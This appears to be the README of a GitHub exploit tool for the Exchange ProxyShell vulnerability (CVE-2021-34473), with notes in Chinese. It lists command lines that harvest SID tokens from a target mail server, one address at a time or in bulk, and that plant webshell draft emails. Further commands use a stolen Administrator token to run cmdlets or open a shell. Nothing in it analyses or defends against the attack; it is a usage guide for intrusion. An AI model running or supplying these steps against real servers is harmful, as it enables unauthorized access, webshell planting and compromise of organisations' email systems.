- python send_webshell_mail.py https://mail16.echod.com aaa@echod.com  单个获取


- python send_webshell_mail.py https://mail16.echod.com crack  批量从mail.txt 读取邮件，进行尝试获取SID token


- python send_webshell_mail.py https://mail16.echod.com aaa@echod.com  send  (只发送webshell 草稿邮件)


- python send_webshell_mail.py https://mail16.echod.com crack send 批量发恶意邮件 （不建议这么做）


- python wsman_shell.py https://mail.echod.com Administrator@echod.com [这里替换获取到的token]   这里只进入cmdlet 执行命令


     ###### 发送邮件后可以直接使用 这个命令即可尝试getshell，具体Path可在脚本路径里调
 - python wsman_shell.py https://mail.echod.com Administrator@echod.com [这里替换获取到的token] shell

##### Test Send mail
![](https://github.com/je6k/CVE-2021-34473-Exchange-ProxyShell/blob/main/send_mail.png?raw=true)




##### Test shell  Response eeeee

![](https://github.com/je6k/CVE-2021-34473-Exchange-ProxyShell/blob/main/getshell.png?raw=true)



##### Crypt_webshell

![](https://github.com/je6k/CVE-2021-34473-Exchange-ProxyShell/blob/main/Crypt_shellcontent.png?raw=true)
